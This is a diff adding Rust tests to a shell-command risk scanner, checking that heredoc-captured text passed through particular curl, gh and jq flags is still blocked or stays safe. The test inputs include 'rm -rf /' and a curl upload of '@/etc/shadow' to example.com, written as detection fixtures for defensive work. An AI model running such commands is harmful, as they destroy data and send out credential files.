@@ -331,3 +331,72 @@ fn assess_captured_heredoc_forwarding_allowlist_permits_listed_programs() {
         );
     }
 }
+
+// Issue #396 review follow-up: PR #463's forwarding allowlist trusted any
+// argument of `gh`/`curl`/`jq`, which is wider than what those programs
+// actually treat as inline data. `jq -n`/`-f` read the value as program
+// text or a file path, `gh --input`/`-F` read or upload a file, and `curl
+// -T`/`-K`/`-o`/a bare URL each turn the value into something other than a
+// posted body. Each case below must still fire once the capture is used
+// this way.
+#[test]
+fn assess_captured_heredoc_narrow_data_flag_violations_still_fire() {
+    let cases = [
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\njq -n \"$x\"",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\njq -f \"$x\"",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh api -X POST --input \"$x\" /repos/x/y/issues",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh api -F body=\"$x\" /repos/x/y/issues",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -T \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -K \"$x\"",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl -o \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl \"$x\"",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\nprintf \"$x\"",
+    ];
+    for cmd in cases {
+        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
+    }
+}
+
+// Same review follow-up: `curl -d`/`--data`* and `gh -F` read an
+// `@`-prefixed value as a file to upload, so a captured body that starts
+// with `@` must keep firing through those flags even though the same flags
+// are trusted for a body that does not. The second body line still says
+// `rm -rf /` so FS-001 has something to match once the body stays scanned.
+#[test]
+fn assess_captured_heredoc_at_prefixed_body_through_narrow_data_flags_still_fires() {
+    let cases = [
+        "x=$(cat <<'EOF'\n@/etc/shadow\nrm -rf /\nEOF\n)\ncurl -d \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\n@/etc/shadow\nrm -rf /\nEOF\n)\ngh api -F body=@\"$x\" /repos/x/y/issues",
+    ];
+    for cmd in cases {
+        assert_assessment_matches_pattern(cmd, RiskLevel::Block, "FS-001");
+    }
+}
+
+// The allowlist's trusted side under the narrowed rules (issue #396 review
+// follow-up): `jq --arg`/`--argjson`, `curl --data-raw` (unconditionally
+// trusted, unlike the conditional `-d`/`--data`* flags), and `gh`'s
+// `-t`/`-b` title/body flags together.
+#[test]
+fn assess_captured_heredoc_narrow_data_flag_matches_stay_safe() {
+    let cases = [
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\njq -n --arg b \"$x\" '{b:$b}'",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ncurl --data-raw \"$x\" https://example.com",
+        "x=$(cat <<'EOF'\nrm -rf /\nEOF\n)\ngh issue create -t \"$x\" -b \"$x\"",
+    ];
+    for cmd in cases {
+        let s = scanner();
+        let assessment = s.assess(cmd);
+        assert_eq!(
+            assessment.risk,
+            RiskLevel::Safe,
+            "expected Safe for {cmd:?}, got {:?} ({:?})",
+            assessment.risk,
+            assessment
+                .matched
+                .iter()
+                .map(|m| m.pattern.id.as_ref())
+                .collect::<Vec<_>>()
+        );
+    }
+}
